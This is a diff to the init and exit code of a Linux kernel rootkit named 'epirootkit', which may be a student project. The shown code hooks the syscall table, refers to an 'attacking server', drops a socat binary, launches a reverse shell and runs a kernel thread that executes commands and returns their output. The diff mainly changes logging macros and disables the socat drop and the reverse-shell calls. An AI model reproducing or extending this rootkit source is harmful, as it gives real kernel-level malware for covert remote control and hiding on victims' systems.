@@ -29,7 +29,7 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
  */
 static int __init epirootkit_init(void)
 {
-	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
+	DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
 
 	// Initalize hooks for the syscall table
 	int err;
@@ -45,21 +45,21 @@ static int __init epirootkit_init(void)
 	// std_out: output of the command
 	// std_err: error output of the command
 	if(init_exec_result() != SUCCESS) {
-		pr_err("epirootkit: epirootkit_init: memory allocation failed\n");
+		ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
 		return -ENOMEM;
 	}
 
-	if(drop_socat_binaire() != SUCCESS) {
-		pr_err("epirootkit: epirootkit_init: failed to drop socat binary\n");
+	if(0 && drop_socat_binaire() != SUCCESS) {
+		ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
 		return -FAILURE;
 	}
 
-	launch_reverse_shell();
+	// launch_reverse_shell();
 
 	// Start a kernel thread that will handle network communication
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
 	if (IS_ERR(network_thread)) {
-		pr_err("epirootkit: epirootkit_init: failed to start thread\n");
+		ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
 		return PTR_ERR(network_thread);
 	}
 
@@ -73,12 +73,12 @@ static int __init epirootkit_init(void)
  */
 static void __exit epirootkit_exit(void)
 {
-	stop_reverse_shell();
+	// stop_reverse_shell();
 
 	if (network_thread) {
 		if (!thread_exited)
 			kthread_stop(network_thread);
-		pr_info("epirootkit: close_thread: thread stopped\n");
+		DBG_MSG("epirootkit: close_thread: thread stopped\n");
 	}
 
 	close_socket();
@@ -86,7 +86,7 @@ static void __exit epirootkit_exit(void)
 	// Remove hooks from the syscall table
 	fh_remove_hooks(hooks, hook_array_size);
 
-	pr_info("epirootkit: epirootkit_exit: module unloaded\n");
+	DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
 
 
